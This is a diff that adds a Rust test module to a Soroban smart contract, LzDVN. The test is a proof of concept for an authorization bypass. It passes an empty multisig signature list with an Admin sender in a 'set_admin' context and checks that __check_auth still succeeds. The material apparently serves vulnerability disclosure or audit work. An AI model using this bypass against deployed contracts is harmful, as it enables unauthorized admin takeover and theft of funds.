@@ -140,3 +140,91 @@ impl LzDVN {
         ])
     }
 }
+
+// ============================================================================
+// Test-only Functions
+// ============================================================================
+
+#[cfg(test)]
+mod test {
+    use super::*;
+    // 🚨 We put testutils::Address as _ back in!
+    use soroban_sdk::{testutils::Address as _, testutils::Ledger as _, Env, IntoVal, vec, BytesN, Vec, Address, Symbol, Bytes};
+    use soroban_sdk::auth::{Context, ContractContext};
+
+    // ==========================================
+    // 🚨 POC: DIRECT AUTH ISOLATION TEST 🚨
+    // ==========================================
+
+    #[test]
+    fn test_poc_ghost_signature_direct() {
+        let env = Env::default();
+        
+        // 1. Setup the 9 dummy arguments and initialize the DVN
+        let vid: u32 = 1;
+        let signers: Vec<BytesN<20>> = vec![&env, BytesN::from_array(&env, &[1; 20])];
+        let threshold: u32 = 1;
+        let admins: Vec<Address> = vec![&env, Address::generate(&env)];
+        let supported_msglibs: Vec<Address> = vec![&env, Address::generate(&env)];
+        let price_feed = Address::generate(&env);
+        let default_multiplier_bps: u32 = 10000;
+        let worker_fee_lib = Address::generate(&env);
+        let deposit_address = Address::generate(&env);
+
+        let init_args = (
+            vid,
+            signers,
+            threshold,
+            admins,
+            supported_msglibs,
+            price_feed,
+            default_multiplier_bps,
+            worker_fee_lib,
+            deposit_address,
+        );
+
+        let dvn_id = env.register(crate::dvn::LzDVN, init_args);
+        
+        // 2. THE ATTACK PAYLOAD: Empty Signatures
+        env.ledger().set_timestamp(1000); 
+        
+        let auth_data = crate::TransactionAuthData {
+            vid: 1,
+            expiration: 2000, 
+            signatures: vec![&env], // 🚨 THE EXPLOIT: Zero MultiSig Signatures 🚨
+            sender: crate::Sender::Admin(BytesN::from_array(&env, &[0; 32]), BytesN::from_array(&env, &[0; 64])),
+        };
+
+        // 3. TARGET: Simulate the 'set_admin' context to trigger the bypass logic
+        let attacker = Address::generate(&env);
+        let ctx = Context::Contract(ContractContext {
+            contract: dvn_id.clone(),
+            fn_name: Symbol::new(&env, "set_admin"),
+            args: (&attacker, true).into_val(&env),
+        });
+        let auth_contexts = vec![&env, ctx];
+        
+        // Native crypto engine for valid payload type
+        let dummy_bytes = Bytes::new(&env);
+        let signature_payload = env.crypto().sha256(&dummy_bytes);
+
+        // 4. THE MOMENT OF TRUTH: Wrap the call in as_contract so storage works!
+        let result = env.as_contract(&dvn_id, || {
+            crate::dvn::LzDVN::__check_auth(
+                env.clone(), 
+                signature_payload, 
+                auth_data, 
+                auth_contexts
+            )
+        });
+
+        // 5. Check if the exploit succeeded
+        assert!(
+            result.is_ok(), 
+            "FALSE POSITIVE: The transaction panicked, meaning it is secure."
+        );
+        
+        extern crate std;
+        std::println!("CRITICAL VULNERABILITY CONFIRMED: __check_auth returned Ok(()) despite 0 valid signatures.");
+    }
+}
